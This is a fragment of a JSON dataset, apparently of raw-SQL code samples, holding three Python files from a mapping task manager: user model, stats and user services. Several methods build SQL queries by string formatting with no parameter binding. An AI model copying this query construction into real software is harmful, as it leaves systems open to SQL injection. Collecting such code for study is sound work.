        "source": "import geojson\nimport datetime\nimport dateutil.parser\nfrom server import db\nfrom sqlalchemy import desc\nfrom server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \\\n    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser\nfrom server.models.postgis.licenses import License, users_licenses_table\nfrom server.models.postgis.project_info import ProjectInfo\nfrom server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole\nfrom server.models.postgis.utils import NotFound, timestamp\n\nclass User(db.Model):\n    \"\"\" Describes the history associated with a task \"\"\"\n    __tablename__ = \"users\"\n\n    id = db.Column(db.BigInteger, primary_key=True, index=True)\n    validation_message = db.Column(db.Boolean, default=True, nullable=False)\n    username = db.Column(db.String, unique=True)\n    role = db.Column(db.Integer, default=0, nullable=False)\n    mapping_level = db.Column(db.Integer, default=1, nullable=False)\n    projects_mapped = db.Column(db.Integer, default=1, nullable=False)\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\n    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)\n    projects_mapped = db.Column(db.ARRAY(db.Integer))\n    email_address = db.Column(db.String)\n    is_email_verified = db.Column(db.Boolean, default=False)\n    is_expert = db.Column(db.Boolean, default=False)\n    twitter_id = db.Column(db.String)\n    facebook_id = db.Column(db.String)\n    linkedin_id = db.Column(db.String)\n    date_registered = db.Column(db.DateTime, default=timestamp)\n    # Represents the date the user last had one of their tasks validated\n    last_validation_date = db.Column(db.DateTime, default=timestamp)\n\n    # Relationships\n    accepted_licenses = db.relationship(\"License\", secondary=users_licenses_table)\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def save(self):\n        db.session.commit()\n\n    def get_by_id(self, user_id: int):\n        \"\"\" Return the user for the specified id, or None if not found \"\"\"\n        return User.query.get(user_id)\n\n    def get_by_username(self, username: str):\n        \"\"\" Return the user for the specified username, or None if not found \"\"\"\n        return User.query.filter_by(username=username).one_or_none()\n\n    def update_username(self, username: str):\n        \"\"\" Update the username \"\"\"\n        self.username = username\n        db.session.commit()\n\n    def update(self, user_dto: UserDTO):\n        \"\"\" Update the user details \"\"\"\n        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None\n        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None\n        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None\n        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None\n        self.validation_message = user_dto.validation_message\n        db.session.commit()\n\n    def set_email_verified_status(self, is_verified: bool):\n        \"\"\" Updates email verfied flag on successfully verified emails\"\"\"\n        self.is_email_verified = is_verified\n        db.session.commit()\n\n    def set_is_expert(self, is_expert: bool):\n        \"\"\" Enables or disables expert mode on the user\"\"\"\n        self.is_expert = is_expert\n        db.session.commit()\n\n    @staticmethod\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Search and filter all users \"\"\"\n\n        # Base query that applies to all searches\n        base = db.session.query(User.id, User.username, User.mapping_level, User.role)\n\n        # Add filter to query as required\n        if query.mapping_level:\n            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)\n        if query.username:\n            base = base.filter(User.username.ilike(query.username.lower() + '%'))\n        if query.role:\n            base = base.filter(User.role == UserRole[query.role.upper()].value)\n\n        results = base.order_by(User.username).paginate(query.page, 20, True)\n\n        dto = UserSearchDTO()\n        for result in results.items:\n            listed_user = ListedUser()\n            listed_user.id = result.id\n            listed_user.mapping_level = MappingLevel(result.mapping_level).name\n            listed_user.username = result.username\n            listed_user.role = UserRole(result.role).name\n\n            dto.users.append(listed_user)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def get_all_users_not_pagainated():\n        \"\"\" Get all users in DB\"\"\"\n        return db.session.query(User.id).all()\n\n\n    @staticmethod\n    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Finds users that matches first characters, for auto-complete.\n\n        Users who have participated (mapped or validated) in the project, if given, will be\n        returned ahead of those who have not.\n        \"\"\"\n        # Note that the projects_mapped column includes both mapped and validated projects.\n        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(\"participant\")) \\\n            .filter(User.username.ilike(user_filter.lower() + '%')) \\\n            .order_by(desc(\"participant\").nullslast(), User.username).paginate(page, 20, True)\n        if results.total == 0:\n            raise NotFound()\n\n        dto = UserFilterDTO()\n        for result in results.items:\n            dto.usernames.append(result.username)\n            if project_id is not None:\n                participant = ProjectParticipantUser()\n                participant.username = result.username\n                participant.project_id = project_id\n                participant.is_participant = bool(result.participant)\n                dto.users.append(participant)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Adds projects to mapped_projects if it doesn't exist \"\"\"\n        sql = \"select * from users where id = {0} and projects_mapped @> '{{{1}}}'\".format(user_id, project_id)\n        result = db.engine.execute(sql)\n\n        if result.rowcount > 0:\n            return  # User has previously mapped this project so return\n\n        sql = '''update users\n                    set projects_mapped = array_append(projects_mapped, {0})\n                  where id = {1}'''.format(project_id, user_id)\n\n        db.engine.execute(sql)\n\n    @staticmethod\n    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:\n        \"\"\" Get all projects a user has mapped on \"\"\"\n\n        # This query looks scary, but we're really just creating an outer join between the query that gets the\n        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to\n        # handle cases where users have only validated tasks on a project, or only mapped on a project.\n        sql = '''SELECT p.id,\n                        p.status,\n                        p.default_locale,\n                        c.mapped,\n                        c.validated,\n                        st_asgeojson(p.centroid)\n                   FROM projects p,\n                        (SELECT coalesce(v.project_id, m.project_id) project_id,\n                                coalesce(v.validated, 0) validated,\n                                coalesce(m.mapped, 0) mapped\n                          FROM (SELECT t.project_id,\n                                       count (t.validated_by) validated\n                                  FROM tasks t\n                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\n                                   AND t.validated_by = {0}\n                                 GROUP BY t.project_id, t.validated_by) v\n                         FULL OUTER JOIN\n                        (SELECT t.project_id,\n                                count(t.mapped_by) mapped\n                           FROM tasks t\n                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})\n                            AND t.mapped_by = {0}\n                          GROUP BY t.project_id, t.mapped_by) m\n                         ON v.project_id = m.project_id) c\n                   WHERE p.id = c.project_id ORDER BY p.id DESC'''.format(user_id)\n\n        results = db.engine.execute(sql)\n\n        if results.rowcount == 0:\n            raise NotFound()\n\n        mapped_projects_dto = UserMappedProjectsDTO()\n        for row in results:\n            mapped_project = MappedProject()\n            mapped_project.project_id = row[0]\n            mapped_project.status = ProjectStatus(row[1]).name\n            mapped_project.tasks_mapped = row[3]\n            mapped_project.tasks_validated = row[4]\n            mapped_project.centroid = geojson.loads(row[5])\n\n            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])\n            mapped_project.name = project_info.name\n\n            mapped_projects_dto.mapped_projects.append(mapped_project)\n\n        return mapped_projects_dto\n\n    def set_user_role(self, role: UserRole):\n        \"\"\" Sets the supplied role on the user \"\"\"\n        self.role = role.value\n        db.session.commit()\n\n    def set_mapping_level(self, level: MappingLevel):\n        \"\"\" Sets the supplied level on the user \"\"\"\n        self.mapping_level = level.value\n        db.session.commit()\n\n    def accept_license_terms(self, license_id: int):\n        \"\"\" Associate the user in scope with the supplied license \"\"\"\n        image_license = License.get_by_id(license_id)\n        self.accepted_licenses.append(image_license)\n        db.session.commit()\n\n    def has_user_accepted_licence(self, license_id: int):\n        \"\"\" Test to see if the user has accepted the terms of the specified license\"\"\"\n        image_license = License.get_by_id(license_id)\n\n        if image_license in self.accepted_licenses:\n            return True\n\n        return False\n\n    def delete(self):\n        \"\"\" Delete the user in scope from DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def as_dto(self, logged_in_username: str) -> UserDTO:\n        \"\"\" Create DTO object from user in scope \"\"\"\n        user_dto = UserDTO()\n        user_dto.id = self.id\n        user_dto.username = self.username\n        user_dto.role = UserRole(self.role).name\n        user_dto.mapping_level = MappingLevel(self.mapping_level).name\n        user_dto.is_expert = self.is_expert or False\n        user_dto.date_registered = str(self.date_registered)\n        try:\n            user_dto.projects_mapped = len(self.projects_mapped)\n        # Handle users that haven't touched a project yet.\n        except:\n            user_dto.projects_mapped = 0\n        user_dto.tasks_mapped = self.tasks_mapped\n        user_dto.tasks_validated = self.tasks_validated\n        user_dto.tasks_invalidated = self.tasks_invalidated\n        user_dto.twitter_id = self.twitter_id\n        user_dto.linkedin_id = self.linkedin_id\n        user_dto.facebook_id = self.facebook_id\n        user_dto.validation_message = self.validation_message\n        user_dto.total_time_spent = 0\n        user_dto.time_spent_mapping = 0\n        user_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = {0};\"\"\".format(self.id)\n        total_validation_time = db.engine.execute(sql)\n        for row in total_validation_time:\n            total_validation_time = row[0]\n            if total_validation_time:\n                total_validation_seconds = total_validation_time.total_seconds()\n                user_dto.time_spent_validating = total_validation_seconds\n                user_dto.total_time_spent += user_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = {0};\"\"\".format(self.id)\n        total_mapping_time = db.engine.execute(sql)\n        for row in total_mapping_time:\n            total_mapping_time = row[0]\n            if total_mapping_time:\n                total_mapping_seconds = total_mapping_time.total_seconds()\n                user_dto.time_spent_mapping = total_mapping_seconds\n                user_dto.total_time_spent += user_dto.time_spent_mapping\n\n        if self.username == logged_in_username:\n            # Only return email address when logged in user is looking at their own profile\n            user_dto.email_address = self.email_address\n            user_dto.is_email_verified = self.is_email_verified\n        return user_dto\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/services/stats_service.py",
        "source": "from cachetools import TTLCache, cached\n\nfrom sqlalchemy import func, text\nfrom server import db\nfrom server.models.dtos.stats_dto import (\n    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,\n    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,\n    CampaignStatsDTO\n    )\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.statuses import TaskStatus\nfrom server.models.postgis.task import TaskHistory, User, Task\nfrom server.models.postgis.utils import timestamp, NotFound\nfrom server.services.project_service import ProjectService\nfrom server.services.users.user_service import UserService\n\n\nhomepage_stats_cache = TTLCache(maxsize=4, ttl=30)\n\n\nclass StatsService:\n\n    @staticmethod\n    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,\n                                             new_state: TaskStatus, action='change'):\n        \"\"\" Update stats when a task has had a state change \"\"\"\n\n        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:\n            return  # No stats to record for these states\n\n        project = ProjectService.get_project_by_id(project_id)\n        user = UserService.get_user_by_id(user_id)\n\n        StatsService._update_tasks_stats(project, user, last_state, new_state, action)\n        UserService.upsert_mapped_projects(user_id, project_id)\n        project.last_updated = timestamp()\n\n        # Transaction will be saved when task is saved\n        return project, user\n\n    @staticmethod\n    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,\n                            action='change'):\n\n        # Make sure you are aware that users table has it as incrementing counters,\n        # while projects table reflect the actual state, and both increment and decrement happens\n\n        # Set counters for new state\n        if new_state == TaskStatus.MAPPED:\n            project.tasks_mapped += 1\n        elif new_state == TaskStatus.VALIDATED:\n            project.tasks_validated += 1\n        elif new_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery += 1\n\n        if action == 'change':\n            if new_state == TaskStatus.MAPPED:\n                user.tasks_mapped += 1\n            elif new_state == TaskStatus.VALIDATED:\n                user.tasks_validated += 1\n            elif new_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated += 1\n\n        # Remove counters for old state\n        if last_state == TaskStatus.MAPPED:\n            project.tasks_mapped -= 1\n        elif last_state == TaskStatus.VALIDATED:\n            project.tasks_validated -= 1\n        elif last_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery -= 1\n\n        if action == 'undo':\n            if last_state == TaskStatus.MAPPED:\n                user.tasks_mapped -= 1\n            elif last_state == TaskStatus.VALIDATED:\n                user.tasks_validated -= 1\n            elif last_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated -= 1\n\n    @staticmethod\n    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:\n        \"\"\" Gets all the activity on a project \"\"\"\n\n        results = db.session.query(\n                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,\n                TaskHistory.action_text, User.username\n            ).join(User).filter(\n                TaskHistory.project_id == project_id,\n                TaskHistory.action != 'COMMENT'\n            ).order_by(\n                TaskHistory.action_date.desc()\n            ).paginate(page, 10, True)\n\n        if results.total == 0:\n            raise NotFound()\n\n        activity_dto = ProjectActivityDTO()\n        for item in results.items:\n            history = TaskHistoryDTO()\n            history.history_id = item.id\n            history.task_id = item.task_id\n            history.action = item.action\n            history.action_text = item.action_text\n            history.action_date = item.action_date\n            history.action_by = item.username\n            activity_dto.activity.append(history)\n\n        activity_dto.pagination = Pagination(results)\n        return activity_dto\n\n    @staticmethod\n    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:\n        \"\"\" Get all user contributions on a project\"\"\"\n        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated\n                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped\n                                     from tasks t,\n                                          users u\n                                    where t.mapped_by = u.id\n                                      and t.project_id = {0}\n                                      and t.mapped_by is not null\n                                    group by t.mapped_by, u.username) m FULL OUTER JOIN\n                                  (select t.validated_by, u.username, count(t.validated_by) validated\n                                     from tasks t,\n                                          users u\n                                    where t.validated_by = u.id\n                                      and t.project_id = {0}\n                                      and t.validated_by is not null\n                                    group by t.validated_by, u.username) v\n                                       ON m.mapped_by = v.validated_by\n        '''.format(project_id)\n\n        results = db.engine.execute(contrib_query)\n        if results.rowcount == 0:\n            raise NotFound()\n\n        contrib_dto = ProjectContributionsDTO()\n        for row in results:\n            user_id = row[0] or row[3]\n            user_contrib = UserContribution()\n            user_contrib.username = row[1] if row[1] else row[4]\n            user_contrib.mapped = row[2] if row[2] else 0\n            user_contrib.validated = row[5] if row[5] else 0\n            contrib_dto.user_contributions.append(user_contrib)\n        return contrib_dto\n\n    @staticmethod\n    @cached(homepage_stats_cache)\n    def get_homepage_stats() -> HomePageStatsDTO:\n        \"\"\" Get overall TM stats to give community a feel for progress that's being made \"\"\"\n        dto = HomePageStatsDTO()\n\n        dto.total_projects = Project.query.count()\n        dto.mappers_online = Task.query.filter(\n            Task.locked_by is not None\n            ).distinct(Task.locked_by).count()\n        dto.total_mappers = User.query.count()\n        dto.total_validators = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).distinct(Task.validated_by).count()\n        dto.tasks_mapped = Task.query.filter(\n            Task.task_status.in_(\n                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)\n                )\n            ).count()\n        dto.tasks_validated = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).count()\n\n        org_proj_count = db.session.query(\n            Project.organisation_tag,\n            func.count(Project.organisation_tag)\n        ).group_by(Project.organisation_tag).all()\n\n        untagged_count = 0\n\n        # total_area = 0\n\n\n\n       # dto.total_area = 0\n\n        # total_area_sql = \"\"\"select sum(ST_Area(geometry)) from public.projects as area\"\"\"\n\n        # total_area_result = db.engine.execute(total_area_sql)\n        # current_app.logger.debug(total_area_result)\n        # for rowproxy in total_area_result:\n            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]\n            # for tup in rowproxy.items():\n                # total_area += tup[1]\n                # current_app.logger.debug(total_area)\n        # dto.total_area = total_area\n\n        tasks_mapped_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)\n\n        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']\n\n        tasks_validated_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)\n\n        dto.total_validated_area = tasks_validated_result.fetchone()['sum']\n\n        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\\\n            .group_by(Project.campaign_tag).all()\n        no_campaign_count = 0\n        unique_campaigns = 0\n\n        for tup in campaign_count:\n            campaign_stats = CampaignStatsDTO(tup)\n            if campaign_stats.tag:\n                dto.campaigns.append(campaign_stats)\n                unique_campaigns += 1\n            else:\n                no_campaign_count += campaign_stats.projects_created\n\n        if no_campaign_count:\n            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))\n            dto.campaigns.append(no_campaign_proj)\n        dto.total_campaigns = unique_campaigns\n\n        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\\\n            .group_by(Project.organisation_tag).all()\n        no_org_count = 0\n        unique_orgs = 0\n\n        for tup in org_proj_count:\n            org_stats = OrganizationStatsDTO(tup)\n            if org_stats.tag:\n                dto.organizations.append(org_stats)\n                unique_orgs += 1\n            else:\n                no_org_count += org_stats.projects_created\n\n        if no_org_count:\n            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))\n            dto.organizations.append(no_org_proj)\n        dto.total_organizations = unique_orgs\n\n        return dto\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/services/users/user_service.py",
        "source": "from cachetools import TTLCache, cached\nfrom flask import current_app\nfrom functools import reduce\nimport dateutil.parser\nimport datetime\n\nfrom server import db\nfrom server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \\\n    UserStatsDTO\nfrom server.models.dtos.message_dto import MessageDTO\nfrom server.models.postgis.message import Message\nfrom server.models.postgis.task import TaskHistory\nfrom server.models.postgis.user import User, UserRole, MappingLevel\nfrom server.models.postgis.utils import NotFound\nfrom server.services.users.osm_service import OSMService, OSMServiceError\nfrom server.services.messaging.smtp_service import SMTPService\nfrom server.services.messaging.template_service import get_template\n\nuser_filter_cache = TTLCache(maxsize=1024, ttl=600)\nuser_all_cache = TTLCache(maxsize=1024, ttl=600)\n\n\nclass UserServiceError(Exception):\n    \"\"\" Custom Exception to notify callers an error occurred when in the User Service \"\"\"\n\n    def __init__(self, message):\n        if current_app:\n            current_app.logger.error(message)\n\n\nclass UserService:\n    @staticmethod\n    def get_user_by_id(user_id: int) -> User:\n        user = User().get_by_id(user_id)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def get_user_by_username(username: str) -> User:\n        user = User().get_by_username(username)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def update_username(user_id: int, osm_username: str) -> User:\n        user = UserService.get_user_by_id(user_id)\n        if user.username != osm_username:\n            user.update_username(osm_username)\n\n        return user\n\n    @staticmethod\n    def register_user(osm_id, username, changeset_count):\n        \"\"\"\n        Creates user in DB\n        :param osm_id: Unique OSM user id\n        :param username: OSM Username\n        :param changeset_count: OSM changeset count\n        \"\"\"\n        new_user = User()\n        new_user.id = osm_id\n        new_user.username = username\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        if changeset_count > advanced_level:\n            new_user.mapping_level = MappingLevel.ADVANCED.value\n        elif intermediate_level < changeset_count < advanced_level:\n            new_user.mapping_level = MappingLevel.INTERMEDIATE.value\n        else:\n            new_user.mapping_level = MappingLevel.BEGINNER.value\n\n        new_user.create()\n        return new_user\n\n    @staticmethod\n    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied username \"\"\"\n        requested_user = UserService.get_user_by_username(requested_username)\n        logged_in_user = UserService.get_user_by_id(logged_in_user_id)\n        UserService.check_and_update_mapper_level(requested_user.id)\n\n        return requested_user.as_dto(logged_in_user.username)\n\n    @staticmethod\n    def get_user_dto_by_id(requested_user: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied user id \"\"\"\n        requested_user = UserService.get_user_by_id(requested_user)\n\n        return requested_user.as_dto(requested_user.username)\n\n    @staticmethod\n    def get_detailed_stats(username: str):\n        user = UserService.get_user_by_username(username)\n        stats_dto = UserStatsDTO()\n\n        actions = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text != ''\n        ).all()\n\n        tasks_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'MAPPED'\n        ).count()\n        tasks_validated = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'VALIDATED'\n        ).count()\n        projects_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action == 'STATE_CHANGE'\n        ).distinct(TaskHistory.project_id).count()\n\n        stats_dto.tasks_mapped = tasks_mapped\n        stats_dto.tasks_validated = tasks_validated\n        stats_dto.projects_mapped = projects_mapped\n        stats_dto.total_time_spent = 0\n        stats_dto.time_spent_mapping = 0\n        stats_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = {0};\"\"\".format(user.id)\n        total_validation_time = db.engine.execute(sql)\n        for time in total_validation_time:\n            total_validation_time = time[0]\n            if total_validation_time:\n                stats_dto.time_spent_validating = total_validation_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = {0};\"\"\".format(user.id)\n        total_mapping_time = db.engine.execute(sql)\n        for time in total_mapping_time:\n            total_mapping_time = time[0]\n            if total_mapping_time:\n                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_mapping\n\n        return stats_dto\n\n\n    @staticmethod\n    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:\n        \"\"\" Update user with info supplied by user, if they add or change their email address a verification mail\n            will be sent \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        verification_email_sent = False\n        if user_dto.email_address and user.email_address != user_dto.email_address.lower():\n            # Send user verification email if they are adding or changing their email address\n            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)\n            user.set_email_verified_status(is_verified=False)\n            verification_email_sent = True\n\n        user.update(user_dto)\n        return dict(verificationEmailSent=verification_email_sent)\n\n    @staticmethod\n    @cached(user_all_cache)\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Gets paginated list of users \"\"\"\n        return User.get_all_users(query)\n\n    @staticmethod\n    @cached(user_filter_cache)\n    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Gets paginated list of users, filtered by username, for autocomplete \"\"\"\n        return User.filter_users(username, project_id, page)\n\n    @staticmethod\n    def is_user_a_project_manager(user_id: int) -> bool:\n        \"\"\" Is the user a project manager \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def get_mapping_level(user_id: int):\n        \"\"\" Gets mapping level user is at\"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        return MappingLevel(user.mapping_level)\n\n    @staticmethod\n    def is_user_validator(user_id: int) -> bool:\n        \"\"\" Determines if user is a validator \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def is_user_blocked(user_id: int) -> bool:\n        \"\"\" Determines if a user is blocked \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) == UserRole.READ_ONLY:\n            return True\n\n        return False\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Add project to mapped projects if it doesn't exist, otherwise return \"\"\"\n        User.upsert_mapped_projects(user_id, project_id)\n\n    @staticmethod\n    def get_mapped_projects(user_name: str, preferred_locale: str):\n        \"\"\" Gets all projects a user has mapped or validated on \"\"\"\n        user = UserService.get_user_by_username(user_name)\n        return User.get_mapped_projects(user.id, preferred_locale)\n\n    @staticmethod\n    def add_role_to_user(admin_user_id: int, username: str, role: str):\n        \"\"\"\n        Add role to user\n        :param admin_user_id: ID of admin attempting to add the role\n        :param username: Username of user the role should be added to\n        :param role: The requested role\n        :raises UserServiceError\n        \"\"\"\n        try:\n            requested_role = UserRole[role.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')\n\n        admin = UserService.get_user_by_id(admin_user_id)\n        admin_role = UserRole(admin.role)\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:\n            raise UserServiceError(f'You must be an Admin to assign Admin role')\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:\n            raise UserServiceError(f'You must be an Admin to assign Project Manager role')\n\n        user = UserService.get_user_by_username(username)\n        user.set_user_role(requested_role)\n\n    @staticmethod\n    def set_user_mapping_level(username: str, level: str) -> User:\n        \"\"\"\n        Sets the users mapping level\n        :raises: UserServiceError\n        \"\"\"\n        try:\n            requested_level = MappingLevel[level.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')\n\n        user = UserService.get_user_by_username(username)\n        user.set_mapping_level(requested_level)\n\n        return user\n\n    @staticmethod\n    def set_user_is_expert(user_id: int, is_expert: bool) -> User:\n        \"\"\"\n        Enabled or disables expert mode for the user\n        :raises: UserServiceError\n        \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.set_is_expert(is_expert)\n\n        return user\n\n    @staticmethod\n    def accept_license_terms(user_id: int, license_id: int):\n        \"\"\" Saves the fact user has accepted license terms \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.accept_license_terms(license_id)\n\n    @staticmethod\n    def has_user_accepted_license(user_id: int, license_id: int):\n        \"\"\" Checks if user has accepted specified license \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        return user.has_user_accepted_licence(license_id)\n\n    @staticmethod\n    def get_osm_details_for_user(username: str) -> UserOSMDTO:\n        \"\"\"\n        Gets OSM details for the user from OSM API\n        :param username: username in scope\n        :raises UserServiceError, NotFound\n        \"\"\"\n        user = UserService.get_user_by_username(username)\n        osm_dto = OSMService.get_osm_details_for_user(user.id)\n        return osm_dto\n\n    @staticmethod\n    def check_and_update_mapper_level(user_id: int):\n        \"\"\" Check users mapping level and update if they have crossed threshold \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user_level = MappingLevel(user.mapping_level)\n\n        if user_level == MappingLevel.ADVANCED:\n            return  # User has achieved highest level, so no need to do further checking\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        try:\n            osm_details = OSMService.get_osm_details_for_user(user_id)\n            if (osm_details.changeset_count > advanced_level and\n                user.mapping_level !=  MappingLevel.ADVANCED.value):\n                user.mapping_level = MappingLevel.ADVANCED.value\n                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')\n            elif (intermediate_level < osm_details.changeset_count < advanced_level and\n                user.mapping_level != MappingLevel.INTERMEDIATE.value):\n                user.mapping_level = MappingLevel.INTERMEDIATE.value\n                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')\n        except OSMServiceError:\n            # Swallow exception as we don't want to blow up the server for this\n            current_app.logger.error('Error attempting to update mapper level')\n            return\n\n\n        user.save()\n        return user\n\n    def notify_level_upgrade(user_id: int, username: str, level: str):\n        text_template = get_template('level_upgrade_message_en.txt')\n\n        if username is not None:\n            text_template = text_template.replace('[USERNAME]', username)\n\n        text_template = text_template.replace('[LEVEL]', level)\n        level_upgrade_message = Message()\n        level_upgrade_message.to_user_id = user_id\n        level_upgrade_message.subject = 'Mapper Level Upgrade '\n        level_upgrade_message.message = text_template\n        level_upgrade_message.save()\n\n\n    @staticmethod\n    def refresh_mapper_level() -> int:\n        \"\"\" Helper function to run thru all users in the DB and update their mapper level \"\"\"\n        users = User.get_all_users_not_pagainated()\n        users_updated = 1\n        total_users = len(users)\n\n        for user in users:\n            UserService.check_and_update_mapper_level(user.id)\n\n            if users_updated % 50 == 0:\n                print(f'{users_updated} users updated of {total_users}')\n\n            users_updated += 1\n\n        return users_updated\n",
        "dataset": "plain_sql.json"
    },
    {
